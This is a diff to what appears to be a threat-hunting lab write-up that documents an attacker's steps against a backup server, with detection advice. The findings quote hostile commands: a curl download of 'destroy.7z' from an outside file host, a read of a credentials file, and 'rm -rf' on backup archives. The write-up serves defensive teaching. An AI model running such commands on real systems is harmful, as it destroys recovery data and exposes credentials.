@@ -399,7 +399,7 @@ Monitor for interactive access to local account databases such as /etc/passwd, /
 <summary id="-flag-7">🚩 <strong>Flag 7: DISCOVERY - Scheduled Job Reconnaissance</strong></summary>
 
 ### 🎯 Objective
-<What the attacker was trying to accomplish>
+Understanding backup schedules helps attackers time their destruction for maximum impact.
 
 ### 📌 Finding
 cat /etc/crontab
@@ -449,10 +449,6 @@ Prioritize investigation when scheduled job reconnaissance occurs alongside back
 ### 🎯 Objective
 Attackers download tools from external infrastructure to carry out the attack.
 
-References:
-
-T1105: Ingress Tool Transfer
-
 ### 📌 Finding
 curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z
 
@@ -495,7 +491,7 @@ Monitor critical infrastructure systems, especially backup servers, for interact
 <summary id="-flag-9">🚩 <strong>Flag 9: CREDENTIAL ACCESS - Credential Theft</strong></summary>
 
 ### 🎯 Objective
-<What the attacker was trying to accomplish>
+Backup servers often store sensitive configuration files containing credentials.
 
 ### 📌 Finding
 cat /backups/configs/all-credentials.txt
@@ -540,10 +536,6 @@ Alert on interactive access to files containing credential-related keywords (e.g
 
 ### 🎯 Objective
 Destroying backups eliminates recovery options and maximises ransomware impact.
-
-References:
-
-T1485: Data Destruction
 
 ### 📌 Finding
 rm -rf /backups/archives
